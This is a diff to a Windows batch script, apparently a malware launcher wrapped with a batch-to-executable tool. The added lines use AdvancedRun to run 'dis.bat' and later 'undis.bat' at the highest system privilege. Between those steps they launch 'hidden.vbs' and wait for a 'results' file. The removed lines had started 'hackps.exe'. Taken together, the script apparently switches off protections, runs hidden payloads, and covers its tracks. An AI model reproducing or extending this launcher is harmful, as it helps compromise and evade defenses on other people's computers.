@@ -12,7 +12,7 @@
 ::cRo6pxp7LAbNWATEpCI=
 ::egkzugNsPRvcWATEpCI=
 ::dAsiuh18IRvcCxnZtBJQ
-::cRYluBh/LU+EWAnk
+::cRYluBh/LU+EWAjk
 ::YxY4rhs+aU+JeA==
 ::cxY6rQJ7JhzQF1fEqQJQ
 ::ZQ05rAF9IBncCkqN+0xwdVs0
@@ -31,15 +31,14 @@
 ::
 ::
 ::978f952a14a936cc963da21a135fa983
-set a=0
-msg * start
-:loop
 @echo off
-if %a% GEQ 3 exit
-set /A a=%a%+1
+reg Query "HKLM\Hardware\Description\System\CentralProcessor\0" | find /i "x86" > NUL && set OS=32BIT || set OS=64BIT
+if %OS%==32BIT start AdvancedRun.exe /EXEFilename "dis.bat" /RunAs 8 /Run
+if %OS%==64BIT start AdvancedRun64.exe /EXEFilename "dis.bat" /RunAs 8 /Run
+msg * start
 start hidden.vbs
-if not exist results goto loop
-::powershell -ExecutionPolicy Bypass -File hackps.exe > nul
-start hackps.exe
-msg * done
+:loop
+if not exist results timeout 10
+if %OS%==32BIT start AdvancedRun.exe /EXEFilename "undis.bat" /RunAs 8 /Run
+if %OS%==64BIT start AdvancedRun64.exe /EXEFilename "undis.bat" /RunAs 8 /Run
 exit
